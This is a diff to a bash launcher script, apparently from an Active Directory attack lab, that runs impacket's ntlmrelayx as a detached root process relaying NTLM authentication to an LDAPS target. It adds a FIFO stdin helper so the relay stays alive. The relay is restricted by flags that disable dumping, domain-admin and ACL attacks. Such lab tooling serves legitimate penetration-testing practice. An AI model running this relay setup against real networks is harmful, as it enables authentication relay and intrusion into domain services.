@@ -8,6 +8,8 @@ TARGET="${TARGET:-10.4.10.11}"
 WORK="${WORK:-$HOME/.config/kingdoms/phase03-http-ldaps}"
 LOG="$WORK/ntlmrelayx.log"
 PIDFILE="$WORK/ntlmrelayx.pid"
+FIFO="$WORK/ntlmrelayx.stdin"
+RUNTIME="$ROOT/scripts/phase03/run-with-open-stdin.sh"
 
 find_ntlmrelayx() {
   local c
@@ -41,6 +43,7 @@ cd "$ROOT"
 bash "$ROOT/scripts/phase03/check-http-ldaps-readonly-relay.sh"
 
 NTLMRELAYX="$(find_ntlmrelayx)"
+[[ -x "$RUNTIME" ]] || { echo "FAIL: runtime stdin helper not executable: $RUNTIME" >&2; exit 1; }
 command -v setsid >/dev/null 2>&1 || { echo 'FAIL: setsid not found' >&2; exit 1; }
 
 sudo -v
@@ -55,9 +58,18 @@ mkdir -p "$WORK"
 : >"$LOG"
 chmod 600 "$LOG"
 
-# setsid -f forks a new session and returns immediately. stdin is detached and
-# stdout/stderr stay attached only to the user-owned log file.
-sudo -n setsid -f stdbuf -oL -eL "$NTLMRELAYX"   -t "ldaps://$TARGET"   --no-dump   --no-da   --no-acl   --no-smb-server   --no-wcf-server   --no-raw-server   </dev/null >>"$LOG" 2>&1
+# setsid -f detaches the runtime. The FIFO helper replaces /dev/null as
+# ntlmrelayx stdin so sys.stdin.read() cannot receive an immediate EOF.
+sudo -n setsid -f "$RUNTIME" "$FIFO" \
+  stdbuf -oL -eL "$NTLMRELAYX" \
+  -t "ldaps://$TARGET" \
+  --no-dump \
+  --no-da \
+  --no-acl \
+  --no-smb-server \
+  --no-wcf-server \
+  --no-raw-server \
+  </dev/null >>"$LOG" 2>&1
 
 REAL_PID=""
 for _ in {1..30}; do
